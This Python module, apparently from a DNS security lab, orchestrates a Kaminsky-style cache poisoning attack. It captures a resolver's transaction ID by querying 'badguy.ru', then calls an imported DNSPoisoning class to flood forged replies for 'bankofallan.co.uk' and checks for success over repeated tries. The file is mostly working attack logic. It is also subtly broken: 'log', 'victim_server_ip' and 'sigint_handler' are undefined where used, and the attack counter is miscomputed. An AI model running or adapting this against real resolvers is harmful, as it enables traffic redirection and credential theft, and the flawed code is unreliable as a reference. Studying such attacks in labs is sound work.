    
## @package DNS_Attack
#   This package is responsible to execute all the passage required for the attack
#
import dns.resolver
from dns.resolver import NoAnswer
import multiprocessing
import random #For generating random ID
import time
import socket
import sys
import signal
from blessings import Terminal #For terminal colors
from multiprocessing.pool import ThreadPool
import logging
import threading
from threading import Thread

from dns_poisoning import DNSPoisoning
## DNSAttack
#
#   @brief Brief description
#
#   Extended description
#
class DNSAttack:

    ## Constructors
    #
    #   @param victim_server_ip
    #   @param attacked_domain 
    #   @param bad_udp_ip   The UDP server IP
    #   @param bad_udp_port The UDP server port
    #
    #   @param blessing_terminal The istance of the blessing terminal (Default None)
    #
    def __init__(self, victim_server_ip, attacked_domain, bad_udp_ip, bad_udp_port,\
         ns_server_ip=None, blessing_terminal=None, log=lambda msg: None):
        self.victim_server_ip = victim_server_ip
        self.attacked_domain = attacked_domain
        self.bad_udp_ip = bad_udp_ip
        self.bad_udp_port = bad_udp_port
        self.ns_server_ip = ns_server_ip

        self.t = blessing_terminal

    #Exceptions
    ## InitialQueryFailed
    #   @brief Exception raised when the initial query fails
    #
    #   Raised when initial query performed to get a TXID fails    
    class InitialQueryFailed(Exception):
        pass


    ## Start UDP Server
    #   @brief Start an UDP server on specified port and return the fetched TXID
    #   @return The fetched TXID
    #

    def get_id(self):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        sock.bind((self.bad_udp_ip, self.bad_udp_port))

        print("Listening for incoming DNS request...")

        while True:
            data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
            print("Received response:", data)
            received_id = data[0:2]

            initial_id = int.from_bytes(received_id, byteorder='big')
            #print("RAW ID: ", received_id)
            print("ID: ", initial_id)

            sock.close()
            return initial_id

    ##
    #   @brief Start the process to send the initial query
    #   
    def send_initial_query(self):

        victim_server = dns.resolver.Resolver()
        victim_server.nameservers = [self.victim_server_ip]

        try:
            myAnswers = victim_server.query("badguy.ru", "A")
            for rdata in myAnswers:
                    log(rdata)
        except:
            log("{t.red}{t.bold}Query failed{t.normal}".format(t=self.t))
            raise self.InitialQueryFailed

    #Get IP of the NS server (Unimplemented)
    def get_authoritative_server(self, domain, dns_server_ip):
        dns_server = dns.resolver.Resolver()
        dns_server.nameservers = [dns_server_ip]

        response = dns_server.query(domain, 'NS')
        if response.rrset is not None:
            ns_server = str(response.rrset)
            print("NS server(s): " + ns_server)

            response = dns_server.query(ns_server, 'A')


    def start(self, number_of_tries=50):

        succeded = False

        while number_of_tries and not succeded:

            time.sleep(3)

            log("\n ------ {t.bold}{t.shadow}Attack Number {num}{t.normal} ------\n".format(t=self.t, num=abs(number_of_tries-20)))

            pool = ThreadPool(processes=1)

            log("Starting DNS light server")
            async_id_result = pool.apply_async(self.get_id)

            time.sleep(2)
            
            log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"".format(t=self.t))
            try:
                self.send_initial_query() #Start the DNS listening server
            except self.InitialQueryFailed:
                log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}".format(t=self.t))
                pool.terminate()    #Terminate the UDP server
                sys.exit(-1)

            fetched_id = async_id_result.get()  # get the return value from your function.

            log("Fetched ID: {t.green}{t.bold}{id}{t.normal}".format(t=self.t, id=fetched_id))

            log("Ok, the victim does not know the attack, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\"".format(t=self.t))


            poison= DNSPoisoning(victim_server_ip, "bankofallan.co.uk", '192.168.56.1', '10.0.0.1', fetched_id, sigint_handler, log)


            #Attach SIGINT signal to the DNSPoisoning stop handler
            signal.signal(signal.SIGINT, poison.stop_handler)


            poison.send_inital_query()

            log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...".format(t=self.t))

            poison.start_flooding()

            time.sleep(5)

            log("Checking the attack results")
            if poison.check_poisoning():
                log("\n\nAttack Succeded!!!!")
                succeded = True
            else:
                log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!".format(t=self.t))
                number_of_tries = number_of_tries - 1